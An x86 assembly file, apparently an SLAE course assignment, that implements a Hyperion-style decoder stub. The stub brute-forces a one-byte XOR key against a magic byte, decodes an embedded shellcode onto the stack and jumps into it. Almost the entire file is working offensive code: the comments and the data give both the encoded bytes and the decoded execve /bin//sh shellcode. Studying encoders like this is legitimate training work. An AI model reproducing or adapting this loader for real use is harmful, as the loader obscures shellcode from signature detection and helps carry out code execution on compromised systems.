; SLAE-XXX
; assignemnt x.1: create a small decoder like hyperion 
; originality: 

; the pregerenated key was 0x5c 
; like hyperion we will forget this key and brute force it by using a magic byte at the start of the shellcode 
; ie we need to use 0x77 XOR 0x5c and append it at the start of shellcode 


global _start			

section .text
_start:
	; we jump to symbol call_decoder to get its address onto the stack  
	jmp short call_decoder

decoder:
	; we pop the address of the shellcode into esi (the return address is located on the stack) 
	pop esi
	; we clean ecx 
	xor ecx, ecx
	; put size of the shellcode into ecx 
	mov cl,25
	; we prepare a place to store the decoded shell, here the stack, pointed by edx  
	; nasm compiler makes the stack executable and writable, convenient for us here :] 
	mov edx,esp 

	; prepare the brute force by cleaning eax 
	xor ebx,ebx
	xor eax,eax 
brutekey: 
	inc bl 
	mov byte al, byte[esi] ; we try to xor the first byte 
	xor al,bl 
	; let 0x77 be the "magic byte"
	cmp al,0x77 
	; if we dont find the magic byte we continue 
	jnz brutekey 
	; if zero we have correct byte key inside bl 

	; we skip the magic byte 
	inc esi 

decode:
; xor eax,eax
        mov byte al,byte[esi]
	; we xor al with the correct key 
	xor al,bl 
	; we copy to stack since the code section is non writable 
        mov byte[edx],al
	; we go to next byte and continue 
	inc esi
	inc edx 
	; loop decreases ecx :] 
	loop decode
	; jmp to the decrypted shellcode copied on the stack and execute it, it should be execve-stack decrypted  
	jmp esp


call_decoder:
	call decoder
	; magic byte is 0x77 XOR 0x5c = 0x2b
	Shellcode: db 0x2b, 0x6d,0x9c,0x0c,0x34,0x73,0x73,0x2f,0x34,0x34,0x73,0x3e,0x35,0x32,0xd5,0xbf,0x0c,0xd5,0xbe,0x0f,0xd5,0xbd,0xec,0x57,0x91,0xdc
	; the encoded shellcode is  6d9c0c3473732f3434733e3532d5bf0cd5be0fd5bdec5791dc
        ; the decoded shellcode is \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 execve-stack code
